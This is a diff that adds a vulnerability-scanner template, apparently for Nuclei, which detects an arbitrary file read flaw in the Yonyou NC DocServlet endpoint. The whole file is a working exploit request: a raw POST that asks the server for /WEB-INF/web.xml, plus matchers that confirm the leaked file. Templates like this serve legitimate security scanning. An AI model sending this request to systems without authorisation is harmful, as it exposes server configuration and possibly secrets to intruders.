@@ -1,0 +1,30 @@
+id: yongyouNC-DocServlet-File-reading
+
+info:
+  name: 用友NC DocServlet 任意文件读取漏洞
+  author: yongyouNC
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageId=login&disp=/WEB-INF/web.xml
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'http://java.sun.com'
+          - '<web-app'
+          - '</web-app>'
+          - '<servlet>'
+          - '</servlet>'
+        condition: and
+      - type: status
+        status: 
+          - 200
